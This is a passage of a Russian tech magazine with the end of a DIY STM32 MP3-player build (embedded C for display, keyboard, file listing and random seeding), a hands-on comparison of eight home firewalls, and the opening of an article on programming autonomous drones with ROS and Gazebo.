    if(*chr==0xd0||*chr==0xd1) chr++;
#endif
  }
  ...
}


void st7735_sendchar(char ch){
#ifdef UTF8ASCII
  if(ch==0xd0||ch==0xd1) return; // Игнорировать префиксы
#endif
  ...
}

Таким образом, коды до 0x7F воспринимаются как ASCII, а прочие — как сим‐
волы кириллической страницы. Решение, конечно, не универсальное, и при
встрече с буквой ё мы увидим артефакты, зато это проще всего позволит
обеспечить совместимость с локалью на десктопе.
  Рисовать прогресс‐бар тоже для прос тоты будем текстовыми символами.


void st7735_progress_bar(uint8_t y,uint8_t value,
                         uint16_t color,uint16_t bgcolor){
  // Выглядит это так: =====>‐‐‐‐‐‐‐
  char bar[27];
  uint8_t i, count=value*26/256;
  for(i=0;i<count;i++)bar[i]='=';
  bar[count]='>';
  for(i=count+1;i<26;i++)bar[i]='‐';
  bar[26]=0;
  st7735_string_at(0,y,bar,color,bgcolor);
}

Помимо этого, в библиотеку stprintf.c я добавил функцию вывода с фор‐
матированием на заданную строку, так проще отрисовы вать интерфейс.


int stprintf_at(uint8_t x, uint8_t y,uint16_t color,
                uint16_t bgcolor, uint8_t size,
                const char *format, ...){
  va_list arg;
  char buffer[128];
  SPRINTF_buffer=buffer;
  va_start(arg, format);
  stprintf_((&putc_strg), format, arg);
  va_end(arg);
  *SPRINTF_buffer ='\0';
  if(size==1)
    st7735_string_at(x,y,buffer,color,bgcolor);
  else if(size==2)
    st7735_string_x2_at(x,y,buffer,color,bgcolor);
  else if(size==3)
    st7735_string_x2_at(x,y,buffer,color,bgcolor);
  return 0;
}

Экран разделен на три части. Первая часть — верхние 14 текстовых строк,
используется для вывода сообщений (название текущего тре ка, ошиб ки и так
далее). Вто рая часть — 15‐я строка, где рас положен прогресс‐бар, и пос‐
ледняя, 16‐я строка с информа цией о текущем треке.
  В нижней строке выводят ся следующие данные: «Кбайт прочитано / все го
Кбайт, время от начала трека, режим, номер трека, всего треков». В коде
это выглядит вот так:


// Глобальные переменные
uint8_t zanuda_mode=0, rand_mode=0;
char mode[3]="  ";


...
cnt++;
if(cnt>bitrate){
  //report
  cnt=0;
  dt = vs_read_sci(SCI_DECODE_TIME); // Время воспроизведения
  hdat0=vs_read_sci(SCI_HDAT0);
  bitrate=(hdat0>>12)&0xF;
  min=dt/60;
  sec=dt%60;
  bar=255*pos/fsize;
  if(zanuda_mode) st7735_progress_bar(112,bar,GREEN,BLACK);
  else st7735_progress_bar(112,bar,MAGENTA,BLACK);
  if(zanuda_mode) mode[1]='Z';
  else mode[1]=' ';
  if(rand_mode) mode[0]='R';
  else mode[0]='S';
  stprintf_at(0, 120,RED,BLACK,1, "%4d/%dK %d:%02d %s %d/%d",
              pos/1024,fsize/1024, min, sec, mode, track,
              files_count);
  ...
}

После отрисовки интерфейса идет обра ботчик клавиатуры, сама клавиатура
собрана на сдвиговом регистре 74HC165D и работа ет аналогично клавиату‐
ре телефона из прошлой статьи. Опрос регистра выполняется при помощи
программной эмуляции протокола SPI. Тут уж никаких тонкостей нет.


uint8_t read_key(void){
  uint8_t data,cnt=0;
  gpio_clear(HC165_PORT, HC165_CS); // Включить тактирование
  gpio_clear(HC165_PORT, HC165_PL); // Записать значение в сдвиговый
регистр
  gpio_set(HC165_PORT, HC165_PL);
  for(uint8_t i=0;i<8;i++){
    data<<=1;
    if(gpio_get(HC165_PORT, HC165_Q7)) data|=1;
    gpio_set(HC165_PORT,HC165_CLK);
    gpio_clear(HC165_PORT,HC165_CLK);
  }
  gpio_set(HC165_PORT,HC165_CS);
  data=~data;
  return data;
}

Обработчик нажатий клавиату ры считыва ет состояние клавиатуры из регис‐
тра и, в зависимости от полученного зна чения, выполняет необходимое дей‐
ствие. На данный момент реализованы следующие функции: тише/громче,
следующий трек / предыду щий трек, пауза, рандомное воспроизведение /
последовательное  воспроизведение,  воспроизведение  текущего  трека
(zanuda_mode :) ).
  Поскольку   обработчик   клавиату ры   находит ся   внутри   функции
play_file(), а трек выбирается внутри цикла функции main(), возникает
необходимость передать команду в цикл функции main(). Это можно сделать
с помощью возвращаемых функцией play_file() значений:
 • 0 — сле дующий трек или следующий рандомный трек;
 • 2 — сле дующий трек;
 • 1 — пре дыдущий трек.



                                     Продолжение статьи →
ТРЮКИ               ← НАЧАЛО СТАТЬИ
         MP3-ПЛЕЕР
    СВОИМИ РУКАМИ
               КАК СОБРАТЬ И ЗАПРОГРАММИРОВАТЬ
                            ГАДЖЕТ У СЕБЯ ДОМА





ПОСЛЕДОВАТЕЛЬНОСТЬ ТРЕКОВ
Описанная выше функция play_file() требует на вход пол ный путь к файлу.
Оперировать с именами файлов не очень удобно, кроме того, на это может
потребоваться значительный объем памяти. Поэтому разумно присвоить им
какие‐то номера.
  Получить имена файлов в катало ге позволяет функция f_readdir(&dir,
&fileInfo) библиотеки FatFs. Эта фукнция читает директорию, записы вая
в структуру fileInfo информа цию о фай ле. Ее поле fname и есть имя файла.
Используя ее, мы можем, например, вывести список файлов и под дирек‐
торий в директории.


uint8_t ls(char *path){
  DIR dir;
  FILINFO fileInfo;
  if(f_opendir(&dir, path)) return 1;


  stprintf("\a%s\r\n",path);
  for(;;){
    if(f_readdir(&dir, &fileInfo)) return 2;
    if(fileInfo.fname[0] == 0) break;
    if(fileInfo.fattrib & AM_DIR) stprintf("+DIR  %s\r\n", fileInfo.
fname);
    else stprintf("+ %s\r\n", fileInfo.fname);
  }
  return 0;
}

Это нужно скорее для отладки. А вот для нашей цели потребуется функция
is_mp3(), которая определяет, действительно ли у файла рас ширение MP3.
В случае успеха она возвращает ноль.
   Теперь мы можем легко сосчитать MP3‐фай лы в директории и получить
имя файла номер N (функции cnt_mp3_in_dir() и get_name_mp3()).


uint8_t ismp3(char *name){
  uint16_t len;
  len = strlen(name);
  if(!strncmp(name+len‐4,".mp3",3)) return 0;
  else return 1;
}


uint16_t cnt_mp3_in_dir(char *path){
  DIR dir;
  FILINFO fileInfo;
  uint16_t count=0;
  if(f_opendir(&dir, path)) return 1;


  //stprintf("\a%s\r\n",path);
  for(;;){
    if (f_readdir(&dir, &fileInfo)) return 2;
    if(fileInfo.fname[0] == 0) break;
    if(!(fileInfo.fattrib & AM_DIR))
    if(!ismp3(fileInfo.fname)) count++;
  }
  return count;
}


uint8_t get_name_mp3(char *path, uint16_t n, char *name){
  DIR dir;
  FILINFO fileInfo;
  uint16_t count=0;
  if(f_opendir(&dir, path)) return 1;


  //stprintf("\a%s\r\n",path);
  while(count<n){
    if(f_readdir(&dir, &fileInfo)) return 2;
    if(fileInfo.fname[0] == 0) return 3;
    if(!(fileInfo.fattrib & AM_DIR))
      if(!ismp3(fileInfo.fname))
        count++;
  }
  strcpy(name,fileInfo.fname);
  return 0;
}

Писать отдельную функцию для проигрывания файла по номеру неразумно,
лучше сделать обертку над функцией play_file().


uint8_t play_mp3_n(char *path, uint16_t n){
  char fname[257];
  uint8_t code=0;
  get_name_mp3("/",n,fname);
  code=play_file(fname);
  return code;
}

Отдельного упоминания заслуживает случайное воспроизведение. Получе‐
ние псевдослучайных чисел — это вооб ще особая тема, но к таким вещам,
как MP3‐плеер, она отношения не имеет. Мы же просто воспользуемся фун‐
кцией rand() из библиотеки stdlib.h, но ей для получения пос ледователь‐
ности случайных чисел нужно передать одно слу чайное число. Для одинако‐
вых сидов последовательность всег да будет оди наковой.
   Где на микроконтроллере взять случайное число? Можно взять значение
из счетчика часов реаль ного времени, а мож но счи тать сигнал из АЦП. Пер‐
вый вариант, на мой взгляд, лучше, но часы в этом проекте пока не реали‐
зованы. Поэтому остается читать сигнал из АЦП.
  Последовательность действий такая: включаем АЦП в самом быстром
и неточном режиме и измеряем потенциал на незадействованной ножке кон‐
троллера. К ней лучше подсоединить про водник небольшой длины, чтобы он
работал антенной и ловил наводки. Но это не обя зательно, мы ведь все го
лишь перемешиваем треки в плеере.
  Затем выключаем АЦП за ненадобностью, а полученное значение переда‐
ем в функцию srand(), которая настро ит ГПСЧ.


static uint16_t get_random(void){
  // Получение случайного числа из АЦП
  uint8_t channel=4;
  uint16_t adc=0;
  rcc_periph_clock_enable(RCC_GPIOA);
  /* Configure GPIOs:
   * sensor PA1
   */
  gpio_set_mode(GPIOA, GPIO_MODE_INPUT, GPIO_CNF_INPUT_ANALOG, GPIO4)
;
  rcc_periph_clock_enable(RCC_ADC1);
  rcc_set_adcpre(RCC_CFGR_ADCPRE_PCLK2_DIV2);
  /* Убеждаемся, что АЦП не работает во время настройки */
  adc_power_off(ADC1);
  /* Настраиваем */
  adc_disable_scan_mode(ADC1);
  adc_set_single_conversion_mode(ADC1);
  adc_disable_external_trigger_regular(ADC1);
  adc_set_right_aligned(ADC1);
  /* Мы будем читать датчик температуры, поэтому включаем его */
  //adc_enable_temperature_sensor();
  adc_set_sample_time_on_all_channels(ADC1, ADC_SMPR_SMP_1DOT5CYC);
  adc_power_on(ADC1);
  /* Ждем запуска АЦП */
  for(uint32_t i = 0; i < 800000; i++) __asm__("nop");
  //adc_reset_calibration(ADC1);
  //adc_calibrate(ADC1);


  adc_set_regular_sequence(ADC1, 1, &channel);
  adc_start_conversion_direct(ADC1);
  /* Ждем окончания преобразования */
  while(!(ADC_SR(ADC1) & ADC_SR_EOC));
  adc=ADC_DR(ADC1);
  adc_power_off(ADC1);
  rcc_periph_clock_disable(RCC_ADC1);
  return adc;
}


main(){
  ...
  init_random=get_random();
  stprintf("ADC random is %d\r\n",init_random);
  srand(init_random); // Инициализация ГПСЧ
  ...
}


ЗАКОНЧЕННОЕ УСТРОЙСТВО
Когда все или поч ти все, что хотелось, протестировано на макете, можно
собрать прототип. Для это го были изготовлены две печатные платы.





                         Плата дисплея





                          Плата кодека

В принципе, все детали мож но было уместить и на одной двухсторонней пла‐
те, но я поленился.
  Далее был соб ран дисплейный модуль и испытан на макете.





                 Монтаж дисплейного модуля





                        Тест дисплейного модуля

Затем была распаяна плата кодека и соеди нена с пла той дисплея.





                 Плеер в разоб ранном виде сни зу





                 Плеер в разоб ранном виде сверху





                   Плеер в полусоб ранном виде

И в завершение это все было помещено в корпус из оргстекла, который
получился великоват.





Звучит плеер вполне прилично, но, к несчастью, потребля ет многовато
(порядка 60 мА). Впрочем, это не так страшно.


ЧТО СТОИТ ДОБАВИТЬ
В будущем я планирую добавить поддержку ID3‐тегов, рекурсивный поиск
по файловой системе и поддержку плей‐листов. Ну а ты теперь можешь соб‐
рать собственный плеер и приделать к нему все, что душе угодно!


        WWW

                    •Исходный код про екта на GitHub
ТРЮКИ





ВЫБИРАЕМ


                                                                             Алексей Zemond
                                                                                 Панкратов
                                                                                   3em0nd@gmail.comФАЙРВОЛ

ПРОВЕРЯЕМ ВОСЕМЬ ДОМАШНИХ
ФАЙРВОЛОВ НА СТРОГОСТЬ




Казалось бы, выбрать файрвол для домашнего компь юте‐
ра — дело нехитрое: наливай да пей (то есть устанавливай
да пользуйся). Но файрволы бывают разные, и выбор может
стоить усилий и времени. Сегодня мы рассмотрим восемь
файрволов и проверим их возможности и умолчательные
настройки при помощи простого фун кционального теста.


Наиболее важные факторы при выборе — это простота и дос тупность
настройки, наличие обучающего режима, когда файрвол действует на нервы
задает кучу воп росов при попытках выйти в сеть для каждого ПО, а все
остальное  запрещает.  Еще,  пожалуй,  важны  наличие  русского  язы ка
и бесплатность, а также допол нитель ные плюшки.


ВЕСЕЛЫЕ СТАРТЫ
Изучать мы будем сле дующие программы: Comodo Firewall, Avast Internet Se‐
curity, AVG Internet Security, Outpost Firewall Pro, ZoneAlarm Free Firewall, Private‐
Firewall, GlassWire и TinyWall. Весь этот софт позици они руется разработ‐
чиками  как средства защиты для домашних компьютеров, поэтому мы
не будем залезать в дебри нас троек и сравнивать эти программы по функци‐
ям и различным модулям. Лучше посмотреть на них глазами прос того юзера,
которому все эти высокие технологии до фонаря.
  Обычный пользователь отличает ся от продвинутого количес твом оленей
на свитере и длиной бороды чис то ути литарным под ходом к софту: нажали
«Установить» и верим в чудо авто матизации, которое спасет и защитит
от злых дядек с их скриптами и троянами. А как там оно устроено внутри,
большинству совершенно не важ но.
  Поэтому усло вия эксперимен та решили максимально упростить. Мы уста‐
новим каждый из файрволов на чистую ОС Windows 10 x64 и попробу ем
запустить одну тулзу, которая начинает ломить ся на внешний сервер, ими‐
тируя подозрительную сетевую активность. Затем мы включим режим обу‐
чения и пов торим тест сно ва. Наконец, на третьем этапе мы нас троим фай‐
рвол на основе белого списка, запретив все, что явно не разрешено.


             INFO

                    Используемая в статье тулза для тестирования
                        взята с сайта 2ip.ru.


Ну и не будем забывать про важные для нас критерии: стоимость лицензии,
язык интерфейса и прос тоту настройки и установки. А полученные результаты
мы потом сравним.


COMODO FIREWALL
 • Официальный сайт: comodo.com
 • Системные тре бования: Windows XP SP2, Vista, 7, 8, 10, 152 Мбайт
  RAM, 400 Мбайт на диске
 • Лицен зия: есть бесплатная версия и Pro
 • Сто имость: бесплатно или 39,99 доллара за Pro
 • Язык интерфейса: русский

Эта программа получила широкую известность еще в эпоху Windows XP, когда
Comodo Firewall был едва ли не самым распространенным бес платным фай‐
рволом в России. Поль зуется он популярностью и сейчас. Что, в общем‐то,
неудивительно: разработчики обещают нам проактивную защиту с HIPS, меж‐
сетевое экранирование, защиту от перепол нения буфера и несанкциони‐
рованного доступа, защиту реес тра и системных файлов, а также дру гие вкус‐
ные плюшки.
  Однако во время установки файрвол вызвал смешанные чувс тва. Сначала
предлагал поставить расширения для Яндекс.Бра узера.





                Пос тавим рас ширения от Яндекса?

А потом, если не обратить внимание на «компоненты» и не выключить все
ненужное, установщик инсталлиру ет на твой комп свой браузер.





                Отклю чение ненуж ных компонентов





     Забыли отключить ненужный компонент? Получите, рас пишитесь

Делаем первый тест, и Comodo про пус кает нашу тулзу.





                   Первый тест Comodo Firewall

Вклю чили режим обучения в настройках — и файрвол почему‐то никак
не прореагировал на нашу тес товую программу, которая успешно подклю‐
чилась к удаленному компьютеру.





                     Второй тест Comodo Firewall

Только после составле ния белого списка тулзу наконец удалось заблокиро‐
вать. Вывод напрашивается про тиво речи вый: Comodo Firewall — очень извес‐
тный файрвол, но уста новка ненуж ного софта портит все впечатление.
А результаты теста оказались печальными: для обеспечения безопас ности
программе требуется основательная настройка.


AVAST PREMIUM SECURITY
 • Официальный сайт: avast.com/f‐ﬁrewall
 • Системные тре бования: Windows XP SP3, Vista,  7, 8, 8.1, 10, 256+
  Мбайт ОЗУ и 1,5 Гбайт на диске
 • Лицен зия: проб ный период на 30 дней
 • Сто имость: 1450 руб лей за год, есть раз личные акции. При покупке
   на два или три года цена ниже
 • Язык интерфейса: русский

Кто‐нибудь не слышал про компанию Avast Sofware? Все про нее слышали.
Однако, помимо известного антивиру са, Avast выпускает еще и файрвол,
который входит в платный набор программ Avast Premium Security (раньше он
назывался Avast Internet Security, но его переименовали — видимо, чтобы
избежать путаницы с прог раммой, которую мы рассмотрим следующей). То
есть отдельно загрузить и установить файрвол не получится: он идет в наг‐
рузку к антивирусу, антиспам‐модулю, модулю защиты беспроводных сетей
и набору прочих фишек, платная лицензия которо го стоит 1450 рублей в год
на один ПК.
  При установке пакета нам предлага ют поставить еще и Google Chrome,
но от него хотя бы можно безболезненно отка заться.





                    Ус тановка Avast Internet Security

Сразу после инсталляции чуда не произошло: тул за успешно преодолела
файрвол и установила соединение с удален ным сервером.





                 Первый тест Avast Internet Security

После вклю чения практичес ки всех возможных настроек и параметров
защиты ничего особо не поменя лось. Только заставив файрвол параноидаль‐
но спрашивать меня, как реагировать на каждый чих работающего на компе
софта, я наконец получил ожидаемый результат.





                       Зап рос разрешения

Настройки файрвола разбросаны по раз ным меню, из‐за чего найти с пер‐
вого раза то, что нужно, очень непросто. В комплекте поставки Avast Premium
Security имеется огромное количес тво дополнительных тулз для анализа дис‐
ка, реестра, эвристики, поиска вирусов. Весь этот софт невозможно удалить,
чтобы оставить толь ко один брандмауэр. Кро ме того, пробная версия продук‐
та постоянно просит обновиться до версии Pro и зап латить денег.


AVG INTERNET SECURITY
 • Официальный сайт: avg.com
 • Системные тре бования: Windows XP SP3, Vista, 7, 8, 8.1, 10
 • Лицен зия: проб ный период на 30 дней
 • Сто имость: 1990 рублей за год
 • Язык интерфейса: русский

Бесплатный антивирус AVG также зна ком многим, правда о его эффектив‐
ности существуют разные мнения. Файрвол (или, как его называют разработ‐
чики, «усиленный брандмауэр») тоже не предлага ется в качес тве отдельного
продукта, а идет в комплекте пос тавки AVG Internet Security, куда входит
еще целая куча разных утилит, вклю чая антивирус. Бес платной версии нет,
но есть возможность скачать триал и про тес тировать софтину в течение
месяца.
  Примечательно, что антивирус AVG не так давно был куплен компанией
Avast Sofware, но тем не менее продолжает сущес твовать в роли самос‐
тоятельного про дукта. Что ж, давай посмотрим, есть ли в нем какие‐то сущес‐
твенные отличия от «материнского» про екта.
   Установка AVG начина ется с узна ваемого окошка инстал лера.





                           Ус тановка AVG

При первом запуске мы видим уже знакомую картинку.





                 Первый тест AVG Internet Security

Можно смело сказать, что AVG продемонстрировал все то же самое, что
и Avast. И в точности так же сумел рас познать и заблокировать нашу «вре‐
доносную» тулзу только пос ле принуди тельного вклю чения параноидального
режима.





                  Конфигура ция AVG Internet Security

По результатам теста я пришел к выводу, что AVG Internet Security — это по
большому счету Avast Premium Security, только в профиль только под другой
вывеской. Если тебе нужен один файрвол, без антивируса, антиспама и про‐
чих свистелок, наверное, стоит поискать другое решение.


OUTPOST FIREWALL PRO
 • Официальный сайт: отсутству ет
 • Системные тре бования: Windows XP, Vista, 2003 Server, 2008 Server,
   2012 Server, 7, 8, 8.1, 10
 • Лицен зия: проб ный период 30 дней
 • Сто имость: бесценно
 • Язык интерфейса: русский

В декабре 2015 года Яндекс купил технологию Agnitum, и компания прек‐
ратила выпускать и поддерживать Outpost Firewall. Но его все еще можно най‐
ти в интернете. Есть также бесплатная версия, но она, как обычно, урезана.
   Установка программы типична, но при этом она хотя бы не пред лагает
в нагрузку тонну дополнительного ПО. После завершения инстал ляции
Outpost Firewall Pro просит перезагрузить компь ютер. Соглашаемся и сразу
же запускаем нашу тулзу.





                  Первый тест Outpost Firewall Pro

Несмотря на то что Outpost Firewall больше не поддержи вается, со своей
основной функцией он справляет ся на отлично даже с нас тройками по умол‐
чанию. А для любителей покопать ся в режимах работы программы есть нас‐
тройки правил и возможность включать‐отключать про чие функции.





                      Нас трой ки файрвола

Программе ставим однозначный лайк, жаль толь ко, что пос ледняя платная
версия больше не поддерживается, поэтому денег за нее занести больше
некому (а Яндекс их брать, судя по всему, не хочет). Обновлений тоже ждать
не приходится. Печаль.


                                     Продолжение статьи →
ТРЮКИ               ← НАЧАЛО СТАТЬИ
 ВЫБИРАЕМ ФАЙРВОЛ
                 ПРОВЕРЯЕМ ВОСЕМЬ ДОМАШНИХ
                    ФАЙРВОЛОВ НА СТРОГОСТЬ





ZONEALARM FREE FIREWALL
 • Официальный сайт: zonealarm.com
 • Системные тре бования: Windows XP, Vista, 7, 8, 10
 • Лицен зия: Free и Pro
 • Сто имость: бесплатно или 40 дол ларов в год
 • Язык интерфейса: английский

Компания ZoneAlarm не так широко известна, как Avast и AVG, но тоже балу‐
ется разработкой антивирусов — в свободное от соз дания бесплатного фай‐
рвола время. ZoneAlarm Firewall имеет как бес платную, так и коммерческую
версию. Последняя отличается рас ширенными нас трой ками, возможностью
вклю чать‐отключать компоненты, добавлять сложные правила фильтрации
трафика и отсутствием назойливой рекламы. Все остальные функции продук‐
тов, по заявлениям разработ чиков, идентичны.
  После установки и запуска файрвола ZoneAlarm пропустил наше соеди‐
нение.





                Первый тест ZoneAlarm Free Firewall

Посмотрим, как он себя поведет пос ле небольшой подс тройки.





                  Второй тест ZoneAlarm Free Firewall

Увы, но с помощью переключения ползунков и изменения режимов работы
программы тулзу так и не получилось заб локировать. Только после явной
блокировки это окончатель но удалось. Любопытно, что, когда я копал ся
в настройках, ZoneAlarm выдал вот такое окно зап роса разрешения.





               Режим обучения ZoneAlarm Free Firewall

На скриншоте видно, что у этого файрво ла, помимо стандартных вариантов
«разрешить», «запретить» и «обучение», есть еще один интересный режим —
kill, который вообще не дает запус титься приложению.





                  Режим kill ZoneAlarm Free Firewall

Одна проблема: нужно понимать, что блокиру ешь. Простой юзер может
по незнанию прибить нужную программу, из‐за чего у него обязательно отва‐
лится какой‐нибудь важный банк‐клиент.


PRIVATEFIREWALL
 • Официальный сайт: privacyware.com
 • Системные тре бования: Windows XP, Vista, 7, 8, 8.1, 10
 • Лицен зия: Freeware
 • Сто имость: бесплатно
 • Язык интерфейса: английский

Компания Privacyware специализиру ется в основном на разработке соф та
для защиты веб‐серверов, поэто му файрвол для нее, похоже, побочный про‐
дукт жизнедеятельности. Возможно, поэтому PrivateFirewall раз работчиком
больше не поддерживает ся, и скачать про дукт с офи циального сайта сей час
не выйдет. Зато его до сих пор можно найти на файлопомойках независимых
ресурсах — правда, последняя акту альная версия датируется аж 2013 годом.
  После непродол жительной уста новки сра зу в бой.





                    Первый тест PrivateFirewall

Жаль, но первый блин вышел комом — наш нехитрый тест оказал ся провален.
Пробуем еще раз после включения обучающего режима.





                      Второй тест PrivateFirewall

На этот раз файрвол справляется с задачей: появляется окно с кнопками,
позволяющими заблокировать обнаруженную угро зу. Третий тест в «парано‐
идальном» режиме программа также про ходит успешно, что неудивительно.





                      Третий тест PrivateFirewall

У PrivateFirewall очень прос той интерфейс, и даже без знаний английского
можно легко в нем разоб рать ся.


GLASSWIRE
 • Официальный сайт: glasswire.com
 • Системные тре бования: Microsoft Windows 7, 8, 10 (x86,x64), Intel Core 2
  Duo or Faster Processor, 4 Гбайт RAM. Минималь ные еще ниже
 • Лицен зия: Shareware
 • Сто имость: проб ный период семь дней, потом 39 дол ларов
 • Язык интерфейса: русский

В отличие от предыдущих компаний‐разработчиков, для GlassWire файрвол —
это  базовый продукт,  что,  вероятно,  должно положительно  сказаться
на качестве его работы. Примеча тельно, что у GlassWire’s  Firewall есть
как «настольная», так и мобильная версия, но мы будем рассматривать толь‐
ко первую.
   Установка программы простая и вполне типичная. По ее завершении при‐
ложение покажет нам красивый график нашей сетевой активности. Однако
красота важна прежде всего для девушек с порнохаба произведений
искусства, а нас в первую очередь интересу ют функциональные возможности
файрвола. Запускаем нашу утилитку.





                    Первый тест PrivateFirewall

Несмотря на то что тулза успешно соединилась с уда ленным сервером, фай‐
рвол отобразил новый процесс. Мы можем его проигнорировать, и он
попадет в список доверенных, а можем сразу заблокировать. Выставив более
жесткие настройки политики раз решений, мы видим, что наш процесс сразу
вызывает подозрения файрво ла и успешно блокиру ется.





                      Второй тест PrivateFirewall

Эта программа понравилась мне больше других, единственный ее серьезный
недостаток — платная лицензия, самая бюджетная версия которой сто‐
ит 39 долларов. Зато смотреть на бегущий график сетевой активности можно
бесконечно.


TINYWALL
 • Официальный сайт: tinywall.pados.hu
 • Системные тре бования: Microsoft Windows 7, 8, 10 (x86, x64), Intel Core
   2 Duo or Faster Processor, 4 Гбайт RAM. Минимальные еще ниже
 • Лицен зия: Freeware
 • Сто имость: бесплатно
 • Язык интерфейса: русский

Эта небольшая бесплатная утилита — резуль тат трудов венгерского раз‐
работчика Кароя Падоша (Károly Pados). Фай рвол интересен тем, что работа‐
ет он из трея — несколь ко непривычно. Но при этом уже при проведении пер‐
вого теста он рвется с места в карьер и не дает пробиться в сеть нашей тул‐
зе.





                      Первый тест TinyWall

Самое забавное, что при включении обучающего режима файрвол пропус‐
кает весь трафик и, по идее, должен на осно вании диалогов или внутренне го
механизма решать, что делать с запущен ными процессами. В данном случае
выбор оказался неверен.





                        Второй тест TinyWall

Однако при составлении белого списка TinyWall ожидаемо справился с пос‐
тавленной задачей.





                        Третий тест TinyWall

Выводы: перед нами очень компактный и «облегченный» файрвол с неболь‐
шим количеством настроек. Одна ко этой самой нас трой ки он все равно тре‐
бует: в варианте из коробки программа мышей не ловит.


ИТОГОВЫЕ РЕЗУЛЬТАТЫ
Сведем наши результаты в одну табличку.





Если смотреть на выбор файрвола глазами обычного пользователя, то
наиболее удачным вариантом будет TinyWall или ста ричок Outpost Firewall Pro.
Несмотря на хорошие показа тели GlassWire, рекомендовать эту программу я
не стану из‐за высокой стоимос ти. Но если посмотреть на проблему шире, то
использовать, в принципе, можно любой файрвол. Главное — это правильная
настройка.
GEEK

СВОБОДНЫЙ
ПОЛЕТ

КАК
ПРОГРАММИРУЮТ
БЕСПИЛОТНИКИ





    Юрий Румянцев
Основатель Fast Sense Studio
  yarumyantsev@gmail.com





Управлять  квадрокоптером —  это  целое  искусство,
но писать программы, которые позволяют ему летать в авто‐
номном режиме, — дело не менее захватывающее. В этой
статье я расскажу о том, как создать программу на Python,
которая будет вести беспилотник, и покажу, как протес‐
тировать ее в симуляторе.


Нашими основными инс трументами будут среда разработки приложений
для робототехники Robot  Operating System и  программный симулятор
Gazebo. Их используют, что бы тес тировать алгоритмы в симуляционной сре‐
де и разбивать при этом как можно мень ше техники. И ROS, и Gazebo работа‐
ют в Linux — мы будем работать в Ubuntu 16.04.


КАКИЕ БЫВАЮТ ДРОНЫ
Дроны бывают разные. По конс трукции раз личают нес колько типов дронов:
 • мультироторный — коптеры;
 • самолетный — ﬁxed wing;
 • гибридный — он взлетает вертикаль но, потом использует крылья.

Также дроны  делятся на  потребительские  (consumer) и коммерчес кие
(commercial).
   Потребительские, как ты понимаешь, — это те, которые можно купить
в магазине и использовать как лета ющую камеру. DJI Phantom и Mavic —
хорошие модели. Есть и менее дорогие, но они опре деленно уступают
по качеству. Такие квадрокоптеры используют для съемки раз ных мероп‐
риятий, зданий, исторических объектов. Например, с бес пилотника можно
сделать серию фотог рафий здания или памятника, а затем соз дать из них 3D‐
модель объекта методом фотограмметрии.
   Как правило, такие дроны летают на ручном управле нии, реже по миссии
в автономном режиме по GPS‐координатам. Рынок потребительских квад‐
рокоптеров больше чем наполо вину при надлежит одной компании — DJI.
С ней очень сложно конкурировать, пос кольку там делают реально крутой
продукт: доступный, функциональный, удобный. Хотя в области квадрокоп‐
теров для селфи DJI начина ет теснить компания Skydio со своим дроном R2.
Фишка этого дрона в том, что он может летать автономно, например
за мотоциклистом в лесу. При этом беспилотник видит все препятствия
и прокладывает автономный безопасный маршрут в реальном времени так,
чтобы человек всегда оста вался в кадре. Реально крутая шту ка.
  Коммерческие дроны используются в компаниях для решения определен‐
ной задачи. Одни следят за сос тоянием сельхоз полей, летая над ними
регулярно и делая фотог рафии, дру гие умеют распылять удобрения точечно.
Дроны используют на стройках, в карь ерах. Каждый день они обле тают стро‐
ительный объект, дела ют фотографии, по которым создается 3D‐модель
в облаке, и уже она помога ет отслеживать ежедневные изме нения.
  Пример российской компании, которая активно работает с этой тех‐
нологией на рынке США, — Traceair.
  Другой способ применения — осмотр тру бопроводов дронами. Это осо‐
бенно актуально для России: у нас газовые тру бопроводы тянутся на тысячи
километров, и надо контролировать утечки и врез ки.
   Ну и конечно, у всех на слуху доставка товаров дронами. Не знаю, зарабо‐
тает ли когда‐нибудь сервис Amazon Prime Air, но уже сейчас компания Mat‐
ternet доставляет товары в Цюрихе и некоторых городах США, а компания Zi‐
pline давно отправляет медика менты в полет над просторами Африки. В Рос‐
сии успехов тут пока намного меньше, недавно была новость про дрон Почты
России, который разбился на первом тес те, а Сбербанк тестиру ет доставку
денег дронами.
  Компании Volocopter и Ehang уже имеют лета ющие прототипы такси,
а компания с российскими корнями Hoversurf раз рабаты вает летающий байк.
  В помещениях тоже есть задачи для коммерчес ких дронов, но пока они
не сильно распространены, в этой области идут интенсивные R&D‐иссле‐
дования. Возможные применения для такого вида дронов:
 • инвентаризация складских помещений;
 • инспекции строек внутри зданий;
 • контроль за безопасностью в подземных шахтах;
 • инспекции про мышленного обо рудования в цехах.

Поживем — увидим, какие про екты будут реализованы и задис раптят нашу
жизнь. Глобальная цель — сделать систему управления дроном, которой
герой фильма «Бегущий по лезвию 2049» мог бы сказать: «Сфотографируй
тут все!»


АВТОНОМНАЯ НАВИГАЦИЯ
Коммерческое применение дро нов обычно требует автономного полета, а не
ручного управления. Связано это с тем, что час то коммерчес кие полеты надо
выпол нять регулярно в одном и том же месте и по одному и тому же полет‐
ному  плану,  который можно  запрограммировать  и  снизить  издержки
на пилота.
  Для автономного управления дрону надо как минимум знать с высокой
точностью свои коор динаты в прос транстве. На открытом прос транстве мож‐
но использовать GPS — точность дос тигается в нес колько метров. Допол‐
нительная наземная станция и технология GPS RTK увеличат точность до нес‐
кольких сантиметров. Но наземную станцию не всегда воз можно исполь‐
зовать, и это очень дорого. Обычного GPS хватает для задания маршрута
полета над сельхозполями, стройками, тру бопроводами, и дроны в этих слу‐
чаях летают автономно. Эта функция есть у любого современного дрона,
который можно найти в продаже.
  В таком режиме безопас но летать только в открытом небе без препятс‐
твий. Если речь идет об обследовании зда ний, тру бопроводов или примене‐
нии внутри помеще ний, то тут не обойтись без допол нительных сенсоров,
определяющих расстояние до объектов. Тут исполь зуют одномерные сонары,
лидары, двумерные лидары, 3D‐лидары и камеры глубины. На борту дрона
должен быть установлен дополнитель ный вычис литель, который в реальном
времени будет считывать данные с этих сенсоров, строить 3D‐модель окру‐
жающего пространства и планировать в нем безопас ный маршрут.
   Есть еще одна важная проблема: если мы летаем в замкнутом пространс‐
тве или между высокими зданиями, то сигнал GPS будет недоступен и необ‐
ходимо иметь другой источник координат дрона в прос транстве. Можно
определять свои коор динаты на борту, обрабатывая виде опоток с бортовых
камер — лучше использовать стереока меры или камеры глубины. Такой алго‐
ритм называется SLAM (Simultaneous Localization and Mapping).
  В потоке кадров с камеры алго ритм ищет особые точки (features), которы‐
ми могут быть маленькие уголки, какие‐то неоднородности. Точкам прис‐
ваиваются дескрипторы таким образом, что, если мы найдем эту же точку
в последующих кадрах, когда камера уже успела переместиться в пространс‐
